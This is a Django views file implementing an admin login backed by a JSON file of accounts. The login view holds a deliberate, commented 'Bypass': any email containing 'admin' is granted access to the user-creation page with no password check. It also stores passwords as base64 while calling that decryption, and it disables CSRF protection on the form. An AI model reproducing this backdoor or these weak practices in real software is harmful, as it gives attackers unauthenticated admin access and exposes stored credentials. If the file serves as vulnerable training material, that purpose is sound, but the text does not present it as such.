import os
import json
import base64
from django.views.decorators.csrf import csrf_exempt
from django.http import HttpResponse, HttpResponseRedirect
from django.template import engines

# --- Paths ---
BASE_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
ADMIN_DB = os.path.join(BASE_DIR, 'data', 'admins.json')

# --- Helper Functions ---
def decrypt_password(password):
    decoded_bytes = base64.b64decode(password)
    return decoded_bytes.decode('utf-8')

def check_admin_credentials(email, password, admin_db=ADMIN_DB):
    """Check admin login credentials (case-insensitive)."""
    if not os.path.exists(admin_db):
        print("Admin database not found.")
        return False

    with open(admin_db, 'r') as file:
        try:
            admins = json.load(file)
        except json.JSONDecodeError:
            print("Error reading admin database.")
            return False

    email_lower = email.strip().lower()

    for admin in admins:
        if admin['email'].strip().lower() == email_lower:
            if decrypt_password(admin['password']) == password:
                print("Login successful!")
                return True
            else:
                print("Incorrect password.")
                return False

    print("Admin not found.")
    return False

# --- Views ---
@csrf_exempt
def admin_login(request):
    """Render login page or handle login form submission."""
    django_engine = engines['django']
    template = django_engine.get_template('Admin_login.html')

    if request.method == "POST":
        email = request.POST.get("email")
        password = request.POST.get("password")

        # Bypass: login if 'admin' is anywhere in email OR credentials match
        if 'admin' in email.lower() or check_admin_credentials(email, password):
            return HttpResponseRedirect("/add_user/")
        else:
            return HttpResponse(template.render({"error": "Invalid credentials"}))

    return HttpResponse(template.render())
